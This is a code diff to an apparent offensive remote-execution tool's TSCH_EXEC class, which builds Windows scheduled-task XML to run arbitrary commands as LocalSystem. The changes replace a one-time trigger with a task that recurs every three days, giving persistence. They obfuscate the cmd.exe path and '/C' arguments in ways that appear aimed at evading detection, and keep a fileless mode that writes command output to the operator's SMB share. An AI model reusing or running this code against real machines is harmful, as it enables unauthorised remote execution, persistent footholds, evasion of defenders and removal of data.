@@ -72,9 +72,13 @@ class TSCH_EXEC:
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
-    <RegistrationTrigger>
-      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
-    </RegistrationTrigger>
+    <CalendarTrigger>
+      <StartBoundary>2024-09-29T10:12:18.1178577</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>3</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
   </Triggers>
   <Principals>
     <Principal id="LocalSystem">
@@ -102,18 +106,18 @@ class TSCH_EXEC:
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
-      <Command>cmd.exe</Command>
+      <Command>%WINDIR%\SyStem32\cmd.exe, </Command>
 """
         if self.__retOutput:
-            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
+            self.__output_filename = "\\WINDOWS\\" + gen_random_string(8)
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
-                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>/C, {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
             else:
-                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>/C, {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
 
         elif self.__retOutput is False:
-            argument_xml = f"      <Arguments>/C {command}</Arguments>"
+            argument_xml = f"      <Arguments>/C, {command}</Arguments>"
 
         self.logger.debug("Generated argument XML: " + argument_xml)
         xml += argument_xml
